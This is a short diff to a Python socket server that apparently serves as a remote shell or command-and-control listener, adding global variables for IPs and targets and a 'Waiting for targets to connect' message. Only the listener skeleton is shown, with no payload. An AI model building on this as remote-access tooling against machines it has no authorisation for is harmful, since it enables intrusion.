@@ -83,6 +83,8 @@ def shell(_s, _target, _addr):
 def server():
     global client
     global s
+    global ips
+    global targets
     while True:
         if stop_threads:
             break
@@ -99,10 +101,13 @@ def server():
 
 def main():
     global s
+    global ips
+    global targets
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, PORT))
     s.listen(5)
+    print('[+] Waiting for targets to connect ...')
     t1 = threading.Thread(target=server)
     t1.start()
     while True:
